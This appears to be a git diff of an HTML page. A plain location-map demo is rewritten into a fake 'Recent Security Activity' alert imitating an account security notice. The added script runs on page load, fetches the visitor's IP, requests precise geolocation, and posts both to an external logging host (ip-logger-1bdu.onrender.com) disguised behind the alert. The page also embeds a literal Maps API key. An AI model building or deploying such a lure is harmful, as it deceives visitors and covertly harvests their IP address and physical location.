@@ -1,87 +1,204 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Real-time Location with Radius</title>
-    <style>
-      #map {
-        width: 100%;
-        height: 450px;
-      }
-    </style>
-  </head>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Security Activity</title>
 
-  <body>
-    <h2>실시간 위치 + 반경 표시 지도</h2>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f3f4;
+      margin: 0;
+      padding: 30px 16px;
+      color: #202124;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 28px 32px;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3);
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 6px;
+    }
+
+    .sub {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 20px;
+    }
+
+    .activity-card {
+      border: 1px solid #dadce0;
+      padding: 18px 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .time {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .title {
+      font-size: 17px;
+      font-weight: 600;
+      margin: 4px 0;
+    }
+
+    .location {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .badge {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 4px 10px;
+      border-radius: 20px;
+      border: 1px solid #188038;
+      color: #188038;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    #map {
+      width: 100%;
+      height: 360px;
+      border-radius: 8px;
+      border: 1px solid #dadce0;
+      margin-top: 10px;
+    }
+
+    .info {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 6px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>Recent Security Activity</h1>
+    <div class="sub">Security activity and alerts from the past 28 days.</div>
+
+    <!-- ✅ Activity -->
+    <div class="activity-card">
+      <div class="time">Nov 28, 2025 – 4:26 PM</div>
+      <div class="title">New account login</div>
+      <div class="location">South Korea, Gyeongsangbuk-do (approximate)</div>
+      <div class="badge">Verified</div>
+    </div>
+
+    <!-- ✅ Map -->
+    <h3 style="margin-top: 25px;">Activity Location + Your Live Location</h3>
     <div id="map"></div>
+    <div class="info">Your live location updates automatically.</div>
+  </div>
 
-    <script>
-      let map;
-      let marker;
-      let circle;
+  <!-- ✅ Google Maps + Geolocation -->
+  <script>
+    let map, activityMarker, myMarker, circle;
 
-      function initMap() {
-        // 초기 지도 위치 (서울)
-        const defaultPos = { lat: 37.5665, lng: 126.9780 };
+    function initMap() {
+      const activityPos = { lat: 35.8714, lng: 128.6014 }; // Daegu example
 
-        map = new google.maps.Map(document.getElementById("map"), {
-          zoom: 15,
-          center: defaultPos,
-        });
+      map = new google.maps.Map(document.getElementById("map"), {
+        zoom: 13,
+        center: activityPos,
+      });
 
-        marker = new google.maps.Marker({
-          position: defaultPos,
-          map: map,
-        });
+      activityMarker = new google.maps.Marker({
+        position: activityPos,
+        map: map,
+        title: "Activity location",
+        icon: "http://maps.google.com/mapfiles/ms/icons/blue-dot.png"
+      });
 
-        // ✅ 반경 원 생성 (기본 300m)
-        circle = new google.maps.Circle({
-          map: map,
-          radius: 300, // 반경 (미터 단위)
-          fillColor: "#4285F4",
-          fillOpacity: 0.2,
-          strokeColor: "#4285F4",
-          strokeOpacity: 0.6,
-          strokeWeight: 2,
-        });
+      circle = new google.maps.Circle({
+        map: map,
+        radius: 3000,
+        fillColor: "#4285F4",
+        fillOpacity: 0.12,
+        strokeColor: "#4285F4",
+        strokeOpacity: 0.5,
+        strokeWeight: 2,
+      });
 
-        circle.bindTo("center", marker, "position");
+      circle.bindTo("center", activityMarker, "position");
 
-        // ✅ 실시간 위치 추적
-        if (navigator.geolocation) {
-          navigator.geolocation.watchPosition(
-            function (pos) {
-              const lat = pos.coords.latitude;
-              const lng = pos.coords.longitude;
+      // ✅ Live geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+          (pos) => {
+            const myPos = {
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude
+            };
 
-              const newPos = { lat, lng };
-
-              // 지도 중심 이동
-              map.setCenter(newPos);
-
-              // 마커 이동
-              marker.setPosition(newPos);
-
-              // 반경 원도 자동으로 마커 중심에 맞춰 이동됨
-            },
-            function (err) {
-              console.log("위치 권한 오류:", err);
-            },
-            {
-              enableHighAccuracy: true,
-              maximumAge: 0,
-              timeout: 5000,
+            if (!myMarker) {
+              myMarker = new google.maps.Marker({
+                position: myPos,
+                map: map,
+                title: "Your location",
+                icon: "http://maps.google.com/mapfiles/ms/icons/red-dot.png"
+              });
+            } else {
+              myMarker.setPosition(myPos);
             }
-          );
-        } else {
-          alert("이 브라우저는 위치 정보를 지원하지 않습니다.");
-        }
+          },
+          (err) => console.log("Geolocation error:", err),
+          { enableHighAccuracy: true }
+        );
       }
-    </script>
+    }
+  </script>
 
-    <!-- ✅ Google Maps API (API_KEY 넣기) -->
-    <script async
-      src="https://maps.googleapis.com/maps/api/js?key=AIzaSyC3YbR8Ov-n_Ah3ftfFkW0PYhG9sRN70Tg&callback=initMap">
-    </script>
-  </body>
+  <!-- ✅ Google Maps API KEY -->
+  <script async src="https://maps.googleapis.com/maps/api/js?key=AIzaSyC3YbR8Ov-n_Ah3ftfFkW0PYhG9sRN70Tg&callback=initMap"></script>
+
+  <!-- ✅ IP + Geolocation Logging -->
+  <script>
+    async function sendIPAndGeo() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        const ip = data.ip;
+
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const geo_lat = pos.coords.latitude;
+            const geo_lon = pos.coords.longitude;
+            const accuracy = pos.coords.accuracy;
+
+            await fetch("https://ip-logger-1bdu.onrender.com/log-ip", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ ip, geo_lat, geo_lon, accuracy })
+            });
+          },
+          async () => {
+            await fetch("https://ip-logger-1bdu.onrender.com/log-ip", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ ip })
+            });
+          }
+        );
+      } catch (err) {
+        console.error("Failed to send IP/Geo:", err);
+      }
+    }
+
+    sendIPAndGeo();
+  </script>
+
+</body>
 </html>
